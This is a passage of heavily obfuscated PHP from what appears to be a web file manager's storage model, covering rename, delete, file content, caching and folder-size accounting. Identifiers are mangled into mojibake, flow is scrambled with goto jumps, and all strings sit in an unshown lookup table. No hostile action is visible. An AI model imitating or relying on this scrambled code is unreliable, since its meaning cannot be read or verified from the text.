f‘â¾”ìÀŠ; FÀ­ˆÒ¿íÅ: $aéÊ¬›¬ =& $_SERVER[¹…ÕÄ]; $bË í¤·šŸ = $_SERVER[$aéÊ¬›¬[811]]; $b£´Ë‚‚™É = $aéÊ¬›¬[812]; goto AÄµ”¢è™ˆ; f‘â¾”ìÀŠ: $this->lockMoveEnd($F‡™É¿é…É); Hook::trigger($aéÊ¬›¬[1536], $F­×µ‰ùŞŠ, $CÁ¢Éñ¸Å); return !0; goto EŠ‡ËÊÃÉÛ; f½÷«±ƒà¼: Hook::trigger($aéÊ¬›¬[1949], $F­×µ‰ùŞŠ, $CÁ¢Éñ¸Å); if ($CÁ¢Éñ¸Å) { Model($aéÊ¬›¬[1948])->moveToRecycle($F‡™É¿é…É); } else { $a®•î»Ôá = $this->childrenAll($C±ÜÙå½Ñµ); Model($aéÊ¬›¬[528])->eventRemove($F‡™É¿é…É); $this->removeRelevance($a®•î»Ôá[$aéÊ¬›¬[1947]], $a®•î»Ôá[$aéÊ¬›¬[1324]]); } $this->folderSizeReset($C±ÜÙå½Ñµ[$aéÊ¬›¬[472]]); goto EÃŠˆä¡½¸; EŠ‡ËÊÃÉÛ: } public function childrenAll($bè³•´§©ƒ) { $fÁ…İ²©«» =& $_SERVER[¹…ÕÄ]; $aæøÓÕ…ŒÎ = $bè³•´§©ƒ[$fÁ…İ²©«»[390]]; if ($bè³•´§©ƒ[$fÁ…İ²©«»[397]] == $fÁ…İ²©«»[86]) { $f¯†™ÚÜ¬Ü = array($fÁ…İ²©«»[548] => array($fÁ…İ²©«»[507], $bè³•´§©ƒ[$fÁ…İ²©«»[481]] . $aæøÓÕ…ŒÎ . $fÁ…İ²©«»[508])); $b‡Üùƒáœ = array($fÁ…İ²©«»[548] => $f¯†™ÚÜ¬Ü[$fÁ…İ²©«»[481]]); $fà‰±Ï¥ÍÊ = $this->field($fÁ…İ²©«»[1950])->where($b‡Üùƒáœ)->select(); $C¬¢•âÔ¥³ = !1; $bÕ¯Õ´ÕĞ¼ = array($aæøÓÕ…ŒÎ); if ($fà‰±Ï¥ÍÊ) { $C¬¢•âÔ¥³ = array_to_keyvalue($fà‰±Ï¥ÍÊ, $fÁ…İ²©«»[33], $fÁ…İ²©«»[441]); $C¬¢•âÔ¥³ = array_remove_value($C¬¢•âÔ¥³, $fÁ…İ²©«»[491]); $bÕ¯Õ´ÕĞ¼ = array_to_keyvalue($fà‰±Ï¥ÍÊ, $fÁ…İ²©«»[33], $fÁ…İ²©«»[390]); $bÕ¯Õ´ÕĞ¼[] = $aæøÓÕ…ŒÎ; } } else { $C¬¢•âÔ¥³ = array($bè³•´§©ƒ[$fÁ…İ²©«»[441]]); $bÕ¯Õ´ÕĞ¼ = array($aæøÓÕ…ŒÎ); } return array($fÁ…İ²©«»[1947] => $bÕ¯Õ´ÕĞ¼, $fÁ…İ²©«»[1324] => $C¬¢•âÔ¥³); } public function removeArray($Fõ×ˆÎÆİÖ) { if (!$Fõ×ˆÎÆİÖ) { return !0; } } public function removeRelevance($B¶˜Ëà†£Û, $E”µïÄ†å¢) { goto fê¼â—”¡; D†À±Û‚È: Model($cİïßÕ³Ñ[1803])->where($Eğ¦Ü°‡Şà)->delete(); Model($cİïßÕ³Ñ[528])->where($Eğ¦Ü°‡Şà)->delete(); Model($cİïßÕ³Ñ[1644])->removeBySource($B¶˜Ëà†£Û); goto DïÏœ©ØÎÏ; fÄÃù—Ñ’: $B¶˜Ëà†£Û = array_unique(array_filter($B¶˜Ëà†£Û)); $E”µïÄ†å¢ = array_unique(array_filter($E”µïÄ†å¢)); if (!$B¶˜Ëà†£Û) { return !1; } goto fŠ¼¶¹ŒÆ»; fê¼â—”¡: $cİïßÕ³Ñ =& $_SERVER[¹…ÕÄ]; $B¶˜Ëà†£Û = $B¶˜Ëà†£Û ? $B¶˜Ëà†£Û : array(); $E”µïÄ†å¢ = $E”µïÄ†å¢ ? $E”µïÄ†å¢ : array(); goto fÄÃù—Ñ’; DïÏœ©ØÎÏ: Model($cİïßÕ³Ñ[1929])->removeBySource($B¶˜Ëà†£Û); $this->where($Eğ¦Ü°‡Şà)->delete(); Model($cİïßÕ³Ñ[444])->remove($E”µïÄ†å¢); goto dŠÂŠÍåä; dŠÂŠÍåä: for ($BÃ‰ŸÎ›¼ = 0; $BÃ‰ŸÎ›¼ < count($B¶˜Ëà†£Û); $BÃ‰ŸÎ›¼++) { $this->sourceCacheClear($B¶˜Ëà†£Û[$BÃ‰ŸÎ›¼]); } goto dˆ“õ¼Õ³¹; fŠ¼¶¹ŒÆ»: $Eğ¦Ü°‡Şà = array($cİïßÕ³Ñ[404] => array($cİïßÕ³Ñ[405], $B¶˜Ëà†£Û)); Model($cİïßÕ³Ñ[1948])->where($Eğ¦Ü°‡Şà)->delete(); Model($cİïßÕ³Ñ[435])->where($Eğ¦Ü°‡Şà)->delete(); goto D†À±Û‚È; dˆ“õ¼Õ³¹: } public function rename($d ×ùÏ–, $EÈƒ©“ÀĞÑ) { goto a£†‡îß‡; dâœÙ÷²„•: $this->setNamePinyin($d ×ùÏ–, $dĞÚŒò‘´[$C®¥’¸ïÀ[28]], !1); $this->updateModifyTime($C®ÜŒâŠã[$C®¥’¸ïÀ[472]]); $fî°„†¡¸… = $this->where(array($C®¥’¸ïÀ[404] => $d ×ùÏ–))->data($dĞÚŒò‘´)->save(); goto bîˆåÃŒ†Õ; a£†‡îß‡: $C®¥’¸ïÀ =& $_SERVER[¹…ÕÄ]; $C®ÜŒâŠã = $this->sourceInfo($d ×ùÏ–); if (!$C®ÜŒâŠã) { return !1; } goto D ëœ¿È™; D ëœ¿È™: $F«òÖ“îÍ® = $this->fileNameExist($C®ÜŒâŠã[$C®¥’¸ïÀ[472]], $EÈƒ©“ÀĞÑ); if ($F«òÖ“îÍ® && $F«òÖ“îÍ® != $d ×ùÏ–) { return !1; } $dĞÚŒò‘´ = array($C®¥’¸ïÀ[407] => $EÈƒ©“ÀĞÑ, $C®¥’¸ïÀ[547] => USER_ID); goto C•ÎÊ•ï—; bîˆåÃŒ†Õ: $fÏŞ°”Ú±Ø = $C®¥’¸ïÀ[1937] . $C®ÜŒâŠã[$C®¥’¸ïÀ[472]]; if (isset(self::$cacheChildList[$fÏŞ°”Ú±Ø])) { unset(self::$cacheChildList[$fÏŞ°”Ú±Ø]); } return $fî°„†¡¸…; goto DÄİªõŞÏ; C•ÎÊ•ï—: if (!$C®ÜŒâŠã[$C®¥’¸ïÀ[397]] == $C®¥’¸ïÀ[86]) { $dĞÚŒò‘´[$C®¥’¸ïÀ[399]] = get_path_ext($EÈƒ©“ÀĞÑ); } Model($C®¥’¸ïÀ[528])->eventRename($d ×ùÏ–, $C®ÜŒâŠã[$C®¥’¸ïÀ[28]], $EÈƒ©“ÀĞÑ); $this->sourceCacheClear($d ×ùÏ–); goto dâœÙ÷²„•; DÄİªõŞÏ: } public function setNamePinyin($B°Î½áŸ°ô, $bšˆĞ«£ÀĞ, $A¬ŒØÀÃ½ö = true) { $CÉˆïŞ“Œ” =& $_SERVER[¹…ÕÄ]; $B¬ÅŸõÑìˆ = Input::check($bšˆĞ«£ÀĞ, $CÉˆïŞ“Œ”[551]); if ($A¬ŒØÀÃ½ö && !$B¬ÅŸõÑìˆ) { return; } if (!$B¬ÅŸõÑìˆ) { $this->metaSet($B°Î½áŸ°ô, $CÉˆïŞ“Œ”[438], null); $this->metaSet($B°Î½áŸ°ô, $CÉˆïŞ“Œ”[437], null); return; } $e©Ù×÷¤ŸŠ = array($CÉˆïŞ“Œ”[438] => str_replace($CÉˆïŞ“Œ”[50], $CÉˆïŞ“Œ”[33], Pinyin::encode($bšˆĞ«£ÀĞ)), $CÉˆïŞ“Œ”[437] => Pinyin::encode($bšˆĞ«£ÀĞ, $CÉˆïŞ“Œ”[552])); $this->metaSet($B°Î½áŸ°ô, $e©Ù×÷¤ŸŠ); } public function getContent($A™¢À­ùóÉ) { goto D†ÓÛÕ«³‡; eâœ†¯Úç¤: if (!$däÌßœòÛÜ[$d˜‹ìˆœÒ[75]]) { return $d˜‹ìˆœÒ[33]; } return IO::getContent($däÌßœòÛÜ[$d˜‹ìˆœÒ[75]]); goto dœÇÀáĞî™; F‹í—êÖõ: if ($däÌßœòÛÜ[$d˜‹ìˆœÒ[77]] == 0) { return $d˜‹ìˆœÒ[33]; } $B—¦‰ÉÊèÀ = $d˜‹ìˆœÒ[1951] . $däÌßœòÛÜ[$d˜‹ìˆœÒ[169]]; if ($däÌßœòÛÜ[$d˜‹ìˆœÒ[77]] <= 1024 * 10) { $bêî“ÆËØ½ = Cache::get($B—¦‰ÉÊèÀ); if (!$bêî“ÆËØ½) { $bêî“ÆËØ½ = IO::getContent($däÌßœòÛÜ[$d˜‹ìˆœÒ[75]]); Cache::set($B—¦‰ÉÊèÀ, $bêî“ÆËØ½); } return $bêî“ÆËØ½; } goto eâœ†¯Úç¤; D†ÓÛÕ«³‡: $d˜‹ìˆœÒ =& $_SERVER[¹…ÕÄ]; $däÌßœòÛÜ = $this->fileInfoGet($A™¢À­ùóÉ); if (!$däÌßœòÛÜ) { return !1; } goto F‹í—êÖõ; dœÇÀáĞî™: } public function setDesc($Bñ±†íœƒ, $f¥ÃôÀ†À) { $d´¶ƒÚÛØÌ =& $_SERVER[¹…ÕÄ]; Model($d´¶ƒÚÛØÌ[528])->eventAddDesc($Bñ±†íœƒ, $f¥ÃôÀ†À); return $this->metaSet($Bñ±†íœƒ, $d´¶ƒÚÛØÌ[425], $f¥ÃôÀ†À); } public function setContent($c‰äçØáô•, $a—Ö•Ÿ†„ = '') { goto dôÌÈÁ‰šŒ; dôÌÈÁ‰šŒ: $Fœ™Ú“¬˜ =& $_SERVER[¹…ÕÄ]; $E¸ŠëºÇ±ë = $this->sourceInfo($c‰äçØáô•); $cÈÎ†œêÓ› = $this->fileInfoGet($c‰äçØáô•); goto cÔ¹©‡Å­©; cùÕò„˜’Ï: if (!$D‚éÑá®„Ñ) { return Model($Fœ™Ú“¬˜[444])->remove($A·÷·î¤²§[$Fœ™Ú“¬˜[441]]); } $this->folderSizeReset($E¸ŠëºÇ±ë[$Fœ™Ú“¬˜[472]]); return !0; goto c…×¡ğ¦ÚÜ; cÔ¹©‡Å­©: if (!$cÈÎ†œêÓ› || !$E¸ŠëºÇ±ë) { return !1; } $A·÷·î¤²§ = Model($Fœ™Ú“¬˜[444])->addFileByContent($a—Ö•Ÿ†„, $E¸ŠëºÇ±ë[$Fœ™Ú“¬˜[28]]); $D‚éÑá®„Ñ = $this->fileHistory($E¸ŠëºÇ±ë, $A·÷·î¤²§[$Fœ™Ú“¬˜[441]], $A·÷·î¤²§[$Fœ™Ú“¬˜[77]]); goto cùÕò„˜’Ï; c…×¡ğ¦ÚÜ: } public function fileSubstr($C»µ¥°“ Î, $A×ĞŸŞì‹Œ, $fŒ¬ò ô) { $c£¡Âè„º’ = $this->fileInfoGet($C»µ¥°“ Î); if (!$c£¡Âè„º’) { return !1; } return IO::fileSubstr($c£¡Âè„º’[$_SERVER[¹…ÕÄ][75]], $A×ĞŸŞì‹Œ, $fŒ¬ò ô); } public function fileInfoGet($a´ŞâŒ¾Øî) { goto cñÉâ©Ûë°; aÖøÒ”…Ù¿: $d©ì¬Ş®ƒ = Model($cÄÔ¸›·‹[444])->fileInfo($B“¥’ò“šâ[$cÄÔ¸›·‹[441]]); if ($d©ì¬Ş®ƒ) { $d©ì¬Ş®ƒ[$cÄÔ¸›·‹[28]] = $B“¥’ò“šâ[$cÄÔ¸›·‹[28]]; } self::$cacheFileInfo[$EÜ£°¶½Ù] = $d©ì¬Ş®ƒ; goto AƒëË­¤; AƒëË­¤: return $d©ì¬Ş®ƒ; goto bš­ˆèØ; b´š«¶–ù: $EÜ£°¶½Ù = $cÄÔ¸›·‹[447] . $B“¥’ò“šâ[$cÄÔ¸›·‹[441]]; $dğäÓšÁØ = _get(self::$cacheFileInfo, $EÜ£°¶½Ù); if ($dğäÓšÁØ) { return $dğäÓšÁØ; } goto aÖøÒ”…Ù¿; cñÉâ©Ûë°: $cÄÔ¸›·‹ =& $_SERVER[¹…ÕÄ]; $B“¥’ò“šâ = $this->sourceInfo($a´ŞâŒ¾Øî); if (!$B“¥’ò“šâ || $B“¥’ò“šâ[$cÄÔ¸›·‹[397]]) { return !1; } goto b´š«¶–ù; bš­ˆèØ: } private function folderChildrenNumber($aÚ§Ø‰ÕÖ´) { $f¼á¥ÏôÕŠ =& $_SERVER[¹…ÕÄ]; $DˆÛ‡¯ÄÊ  = $this->sourceInfo($aÚ§Ø‰ÕÖ´); $eàÍùÀÄ¬é = array($f¼á¥ÏôÕŠ[548] => array($f¼á¥ÏôÕŠ[507], $DˆÛ‡¯ÄÊ [$f¼á¥ÏôÕŠ[481]] . $aÚ§Ø‰ÕÖ´ . $f¼á¥ÏôÕŠ[508]), $f¼á¥ÏôÕŠ[416] => intval($DˆÛ‡¯ÄÊ [$f¼á¥ÏôÕŠ[417]]), $f¼á¥ÏôÕŠ[541] => 1); $B´²œÇ åË = $this->where($eàÍùÀÄ¬é)->count(); $A†ïÈÜÛ = $this->where($eàÍùÀÄ¬é)->where(array($f¼á¥ÏôÕŠ[541] => 0))->count(); return array($f¼á¥ÏôÕŠ[81] => $A†ïÈÜÛ, $f¼á¥ÏôÕŠ[82] => $B´²œÇ åË); } public function pathInfo($B“º¯†œ¨Ì, $BÖÌÒ§±Şº = false) { goto càË Õêˆİ; DßÇ±ãà¡›: self::$cachePathInfo[$b ¤ø—Û„´] = $eÜÊ˜šÖˆ¢; return $eÜÊ˜šÖˆ¢; goto cëƒ«¬‹µ¾; càË Õêˆİ: $a–°ÚÍÁ–½ =& $_SERVER[¹…ÕÄ]; $BÖÌÒ§±Şº = !1; $B“º¯†œ¨Ì = intval($B“º¯†œ¨Ì); goto dì‚†‘™õŒ; aµ¬öÀ«ì×: $eÜÊ˜šÖˆ¢ = $this->sourceInfo($B“º¯†œ¨Ì); if (!$eÜÊ˜šÖˆ¢) { return !1; } $eÜÊ˜šÖˆ¢ = $this->_listDataApplyItem($eÜÊ˜šÖˆ¢, $BÖÌÒ§±Şº); goto DßÇ±ãà¡›; dì‚†‘™õŒ: $b ¤ø—Û„´ = $a–°ÚÍÁ–½[433] . intval($BÖÌÒ§±Şº) . $a–°ÚÍÁ–½[434] . $B“º¯†œ¨Ì; $eÉ”å»íÊ® = _get(self::$cachePathInfo, $b ¤ø—Û„´); if ($eÉ”å»íÊ®) { return $eÉ”å»íÊ®; } goto aµ¬öÀ«ì×; cëƒ«¬‹µ¾: } public static $cachePathInfoMore = array(); public function pathInfoMore($EŞ‡ÉÛŒË¥) { goto f”ì†ŠÔôá; e´´ëÚË°: $aŒÀ§“äÀ´ = $this->pathInfo($EŞ‡ÉÛŒË¥); if (!$aŒÀ§“äÀ´) { return !1; } if ($aŒÀ§“äÀ´[$Eƒ©¶”²ÀÄ[397]] == $Eƒ©¶”²ÀÄ[86]) { $aŒÀ§“äÀ´[$Eƒ©¶”²ÀÄ[80]] = $this->folderChildrenNumber($EŞ‡ÉÛŒË¥); } goto A‚İ¾Å‹‚’; f”ì†ŠÔôá: $Eƒ©¶”²ÀÄ =& $_SERVER[¹…ÕÄ]; $FéÉ†‡•¥É = _get(self::$cachePathInfoMore, $EŞ‡ÉÛŒË¥); if ($FéÉ†‡•¥É) { return $FéÉ†‡•¥É; } goto e´´ëÚË°; A‚İ¾Å‹‚’: self::$cachePathInfoMore[$EŞ‡ÉÛŒË¥] = $aŒÀ§“äÀ´; return $aŒÀ§“äÀ´; goto f‰äòøÒ®î; f‰äòøÒ®î: } public function sourceInfo($aéÅ ÍîÛƒ) { goto aˆâÏ®âáé; fĞ‘å–ƒãâ: $F†Ü¹¸µ© = $aõ’Íƒ†ÔŒ[432] . $aéÅ ÍîÛƒ; $A¶¿³½Ş¼Ü = _get(self::$cacheSourceInfo, $F†Ü¹¸µ©); if ($A¶¿³½Ş¼Ü) { return $A¶¿³½Ş¼Ü; } goto aŸÔÊÁØÍÎ; aŸÔÊÁØÍÎ: $Bôõ½î×Ú = $this->where(array($aõ’Íƒ†ÔŒ[390] => $aéÅ ÍîÛƒ))->find(); self::$cacheSourceInfo[$F†Ü¹¸µ©] = $Bôõ½î×Ú; return self::$cacheSourceInfo[$F†Ü¹¸µ©]; goto côÖÜÚÎºË; aˆâÏ®âáé: $aõ’Íƒ†ÔŒ =& $_SERVER[¹…ÕÄ]; if (!$aéÅ ÍîÛƒ) { return array(); } $aéÅ ÍîÛƒ = intval($aéÅ ÍîÛƒ); goto fĞ‘å–ƒãâ; côÖÜÚÎºË: } public function sourceCacheClear($FÖ„İîšöÑ = false) { self::cacheClear($FÖ„İîšöÑ); } public static function cacheClear($EÔ„ƒ²œÌ = false) { $Aã¦˜Ş²šÉ =& $_SERVER[¹…ÕÄ]; if ($EÔ„ƒ²œÌ == !1) { goto C§Úİœ‚¡„; c®×Ë¼¢ÇÏ: return; goto D‚Ì¤¸Ù; fº£Ä†òÚ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto c®×Ë¼¢ÇÏ; C§Úİœ‚¡„: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto fº£Ä†òÚ; D‚Ì¤¸Ù: } unset(self::$cacheSourceInfo[$Aã¦˜Ş²šÉ[432] . $EÔ„ƒ²œÌ]); unset(self::$cachePathInfoMore[$EÔ„ƒ²œÌ]); unset(self::$cachePathInfo[$Aã¦˜Ş²šÉ[1952] . $EÔ„ƒ²œÌ]); unset(self::$cachePathInfo[$Aã¦˜Ş²šÉ[1953] . $EÔ„ƒ²œÌ]); } public function metaSet($BÒä„Œñš, $cøç‹Ü‰·ß = null, $B¼ÄÈ¡§Ëˆ = null) { $f µØõ‰‹º = parent::metaSet($BÒä„Œñš, $cøç‹Ü‰·ß, $B¼ÄÈ¡§Ëˆ); if ($f µØõ‰‹º) { $this->sourceCacheClear($BÒä„Œñš); } return $f µØõ‰‹º; } public function pathInfoByPath($a¨ÉÚĞ¡å, $D½ùºØ‰×«) { $E¤É×Ô“ÑŸ =& $_SERVER[¹…ÕÄ]; $d¯¥ğ’Ñ¶ = !$D½ùºØ‰×« ? array() : explode($E¤É×Ô“ÑŸ[8], trim($D½ùºØ‰×«, $E¤É×Ô“ÑŸ[8])); $E½ÕˆâÑÔ¶ = $a¨ÉÚĞ¡å; foreach ($d¯¥ğ’Ñ¶ as $cÒğæ‹¥†©) { $e®ğî·ª¥ = array($E¤É×Ô“ÑŸ[472] => $E½ÕˆâÑÔ¶, $E¤É×Ô“ÑŸ[28] => $cÒğæ‹¥†©); $f«–†…Ú‚ = $this->where($e®ğî·ª¥)->select(); if (!$f«–†…Ú‚) { return !1; } $f«–†…Ú‚ = array_sort_by($f«–†…Ú‚, $E¤É×Ô“ÑŸ[417]); $E½ÕˆâÑÔ¶ = $f«–†…Ú‚[0][$E¤É×Ô“ÑŸ[390]]; } return $this->pathInfo($E½ÕˆâÑÔ¶, !0); } protected function updateModifyTime($bÈ÷Œùƒê£) { goto A˜ÆÇ‡ªåë; Dïæ”­è‹£: $this->where($fŠù‘¡³¨Ä)->save($BØ‰ÙÄÓ); goto BÍàÆÑõ„á; bßëŞÓ¿”‹: foreach ($bÈ÷Œùƒê£ as $f½Å«Ëá„› => $F…‰ØÆŒ‹) { $bÈ÷Œùƒê£[$f½Å«Ëá„›] = intval($F…‰ØÆŒ‹); $this->sourceCacheClear($F…‰ØÆŒ‹); } $fŠù‘¡³¨Ä = array($B‚Ì­Ñ‰‚È[390] => array($B‚Ì­Ñ‰‚È[7], $bÈ÷Œùƒê£)); $BØ‰ÙÄÓ = array($B‚Ì­Ñ‰‚È[547] => USER_ID, $B‚Ì­Ñ‰‚È[411] => time()); goto Dïæ”­è‹£; A˜ÆÇ‡ªåë: $B‚Ì­Ñ‰‚È =& $_SERVER[¹…ÕÄ]; if (!$bÈ÷Œùƒê£) { return; } if (!is_array($bÈ÷Œùƒê£)) { $bÈ÷Œùƒê£ = array($bÈ÷Œùƒê£); } goto bßëŞÓ¿”‹; BÍàÆÑõ„á: } public function folderSizeReset($d‡›¦ìØ, $d¯¬ñ§ÔÊ† = false) { goto fÂùÅÄÃ©é; Eß¬ŠË°¸: $this->where($E“ÜèÂ•í)->setAdd($f˜«¡¹œŒ[77], $d¯¬ñ§ÔÊ†); CacheLock::unlock($cÑ­‹’Êà±); $bô­®ğÏóÁ = $f˜«¡¹œŒ[1955] . $DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[398]] . $f˜«¡¹œŒ[4] . $DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[478]]; goto aô›È­¹êÂ; fÂùÅÄÃ©é: $f˜«¡¹œŒ =& $_SERVER[¹…ÕÄ]; if ($this->statusIgnoreResetSpace) { return; } $DÖ¤±ÔÅÑ = $this->sourceInfo($d‡›¦ìØ); goto dá‚™½£¶; dá‚™½£¶: $cÑ­‹’Êà± = $f˜«¡¹œŒ[1954] . $d‡›¦ìØ; CacheLock::lock($cÑ­‹’Êà±, 20); if ($d¯¬ñ§ÔÊ† === !1) { $this->sourceCacheClear($d‡›¦ìØ); $DÖ¤±ÔÅÑ = $this->sourceInfo($d‡›¦ìØ); $E“ÜèÂ•í = array($f˜«¡¹œŒ[389] => $d‡›¦ìØ, $f˜«¡¹œŒ[416] => 0); $D¾£Œ¦‰£„ = $this->where($E“ÜèÂ•í)->sum($f˜«¡¹œŒ[77]); $d¯¬ñ§ÔÊ† = intval($D¾£Œ¦‰£„) - intval($DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[77]]); } goto Dƒ ‡ÍÇ; aô›È­¹êÂ: $cì‚É„˜”Æ = array($DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[398]], $DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[478]]); TaskRun::timeLimitCall($bô­®ğÏóÁ, $f˜«¡¹œŒ[1956], $cì‚É„˜”Æ, 1.5); goto Dó…¤†Ä; Dƒ ‡ÍÇ: if ($d¯¬ñ§ÔÊ† == 0) { return CacheLock::unlock($cÑ­‹’Êà±); } $BÓÍ÷¡äŞ´ = $this->parentLevelArray($DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[481]]); if (!$BÓÍ÷¡äŞ´) { $BÓÍ÷¡äŞ´ = array(); } goto FÏìóö–¹ß; FÏìóö–¹ß: $BÓÍ÷¡äŞ´[] = $DÖ¤±ÔÅÑ[$f˜«¡¹œŒ[390]]; $E“ÜèÂ•í = array($f˜«¡¹œŒ[390] => array($f˜«¡¹œŒ[405], $BÓÍ÷¡äŞ´)); if ($d¯¬ñ§ÔÊ† < 0) { $E“ÜèÂ•í[$f˜«¡¹œŒ[77]] = array($f˜«¡¹œŒ[951], abs($d¯¬ñ§ÔÊ†)); } goto Eß¬ŠË°¸; Dó…¤†Ä: } public function folderSizeResetChildren($e‚·Öî’ˆ) { goto cä‡Œ¦ßñ´; cä‡Œ¦ßñ´: $E©òÛËÈŠ =& $_SERVER[¹…ÕÄ]; $this->sourceCacheClear($e‚·Öî’ˆ); $fù‹¿¤½ƒ™ = $this->sourceInfo($e‚·Öî’ˆ); goto B¦†™™ù˜î; DŒÚİ¶ù­: $B—ÆŠ©¢Ø[] = $fù‹¿¤½ƒ™; $B—ÆŠ©¢Ø = array_to_keyvalue($B—ÆŠ©¢Ø, $E©òÛËÈŠ[390]); foreach ($B—ÆŠ©¢Ø as $FÄğã–ÔÈ => $C²¾©¡ÌºÁ) { $B—ÆŠ©¢Ø[$FÄğã–ÔÈ][$E©òÛËÈŠ[1958]] = $B—ÆŠ©¢Ø[$FÄğã–ÔÈ][$E©òÛËÈŠ[77]]; $B—ÆŠ©¢Ø[$FÄğã–ÔÈ][$E©òÛËÈŠ[77]] = 0; } goto eÀî…ÉÑ¹Ö; BñÜŞŠµ¹Ó: foreach ($B—ÆŠ©¢Ø as $C²¾©¡ÌºÁ) { if ($C²¾©¡ÌºÁ[$E©òÛËÈŠ[77]] == $C²¾©¡ÌºÁ[$E©òÛËÈŠ[1958]]) { continue; } $dÏ¯·†¬Ò[] = array($E©òÛËÈŠ[390], $C²¾©¡ÌºÁ[$E©òÛËÈŠ[390]], $E©òÛËÈŠ[77], $C²¾©¡ÌºÁ[$E©òÛËÈŠ[77]]); } $this->saveAll($dÏ¯·†¬Ò); goto bä„Æ†Ó£å; B¦†™™ù˜î: $FÙ²Ÿ†¼‘ = array($E©òÛËÈŠ[541] => 1, $E©òÛËÈŠ[548] => array($E©òÛËÈŠ[507], $fù‹¿¤½ƒ™[$E©òÛËÈŠ[481]] . $e‚·Öî’ˆ . $E©òÛËÈŠ[508])); $FŞÇëˆ…Ş = $E©òÛËÈŠ[1957]; $B—ÆŠ©¢Ø = $this->field($FŞÇëˆ…Ş)->where($FÙ²Ÿ†¼‘)->select(); goto EìšÙ‘‹«İ; eÀî…ÉÑ¹Ö: foreach ($fÎÂ¸„Û† as $C²¾©¡ÌºÁ) { $aèíÖœ–×ò = $C²¾©¡ÌºÁ[$E©òÛËÈŠ[472]] . $E©òÛËÈŠ[33]; if (!isset($B—ÆŠ©¢Ø[$aèíÖœ–×ò])) { continue; } if ($C²¾©¡ÌºÁ[$E©òÛËÈŠ[417]] == $B—ÆŠ©¢Ø[$aèíÖœ–×ò][$E©òÛËÈŠ[417]]) { $B—ÆŠ©¢Ø[$aèíÖœ–×ò][$E©òÛËÈŠ[77]] += $C²¾©¡ÌºÁ[$E©òÛËÈŠ[77]]; } } foreach ($B—ÆŠ©¢Ø as $C²¾©¡ÌºÁ) { $d“ö„¾¯ÌÃ = $this->parentLevelArray($C²¾©¡ÌºÁ[$E©òÛËÈŠ[481]]); foreach ($d“ö„¾¯ÌÃ as $aèíÖœ–×ò) { $aèíÖœ–×ò = $aèíÖœ–×ò . $E©òÛËÈŠ[33]; if (!isset($B—ÆŠ©¢Ø[$aèíÖœ–×ò])) { continue; } if ($C²¾©¡ÌºÁ[$E©òÛËÈŠ[417]] == $B—ÆŠ©¢Ø[$aèíÖœ–×ò][$E©òÛËÈŠ[417]]) { $B—ÆŠ©¢Ø[$aèíÖœ–×ò][$E©òÛËÈŠ[77]] += $C²¾©¡ÌºÁ[$E©òÛËÈŠ[77]]; } } } $dÏ¯·†¬Ò = array(); goto BñÜŞŠµ¹Ó; EìšÙ‘‹«İ: $FÙ²Ÿ†¼‘[$E©òÛËÈŠ[397]] = 0; $fÎÂ¸„Û† = $this->field($FŞÇëˆ…Ş)->where($FÙ²Ÿ†¼‘)->select(); if (!$fÎÂ¸„Û†) { return; } goto DŒÚİ¶ù­; bä„Æ†Ó£å: } public function userSpaceReset($E†îã¼éÎ = false) { $f–ÁÜ¹Æ¹¤ =& $_SERVER[¹…ÕÄ]; $cµ˜†Ï·Ãƒ = $this->where(array($f–ÁÜ¹Æ¹¤[398] => self::TYPE_USER, $f–ÁÜ¹Æ¹¤[478] => $E†îã¼éÎ, $f–ÁÜ¹Æ¹¤[397] => 0))->sum($f–ÁÜ¹Æ¹¤[77]); $cµ˜†Ï·Ãƒ = !$cµ˜†Ï·Ãƒ || $cµ˜†Ï·Ãƒ <= 0 ? 0 : $cµ˜†Ï·Ãƒ; Model($f–ÁÜ¹Æ¹¤[497])->userEdit($E†îã¼éÎ, array($f–ÁÜ¹Æ¹¤[1653] => $cµ˜†Ï·Ãƒ)); } public function targetSpaceUpdate($dâÛßá™, $Dšğ½ˆèôñ) { $C°Òï¡é¤Ï =& $_SERVER[¹…ÕÄ]; if (!$Dšğ½ˆèôñ) { return; } if (!in_array($dâÛßá™, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $a·Áœ²Ç× = $this->targetSpaceSize($dâÛßá™, $Dšğ½ˆèôñ); if ($dâÛßá™ == self::TYPE_USER) { Model($C°Òï¡é¤Ï[497])->userEdit($Dšğ½ˆèôñ, array($C°Òï¡é¤Ï[1653] => $a·Áœ²Ç×)); } else { if ($dâÛßá™ == self::TYPE_GROUP) { Model($C°Òï¡é¤Ï[480])->groupEdit($Dšğ½ˆèôñ, array($C°Òï¡é¤Ï[1653] => $a·Áœ²Ç×)); } } } public function targetSpaceSize($B¤¦ƒ“á‘Ó, $b°á“Ê¢™) { goto F…İÌ×Š“»; a”Ä·²½Ë¾: $dŠí…Ÿ‚ö = floatval($F‰½ŞÊæ­[$dŠ’áÇœÃ®[77]]); $Dç‘Å¾Ú´â = array($dŠ’áÇœÃ®[548] => array($dŠ’áÇœÃ®[507], $dŠ’áÇœÃ®[493] . $F‰½ŞÊæ­[$dŠ’áÇœÃ®[390]] . $dŠ’áÇœÃ®[508])); $f×èãòÆÖƒ = Model($dŠ’áÇœÃ®[415])->field($dŠ’áÇœÃ®[404])->where($Dç‘Å¾Ú´â)->select(); goto EîÛÏÈöğİ; F…İÌ×Š“»: $dŠ’áÇœÃ® =& $_SERVER[¹…ÕÄ]; $F‰½ŞÊæ­ = $this->sourceRoot($B¤¦ƒ“á‘Ó, $b°á“Ê¢™, !0); if (!$F‰½ŞÊæ­) { return 0; } goto a”Ä·²½Ë¾; EîÛÏÈöğİ: $f×èãòÆÖƒ = array_to_keyvalue($f×èãòÆÖƒ, $dŠ’áÇœÃ®[33], $dŠ’áÇœÃ®[390]); $f×èãòÆÖƒ = array_unique(array_filter($f×èãòÆÖƒ)); if ($f×èãòÆÖƒ) { $Dç‘Å¾Ú´â = array($dŠ’áÇœÃ®[404] => array($dŠ’áÇœÃ®[405], $f×èãòÆÖƒ)); $dŠí…Ÿ‚ö += floatval($this->where($Dç‘Å¾Ú´â)->sum($dŠ’áÇœÃ®[77])); } goto Aˆİã†©¦; Aˆİã†©¦: 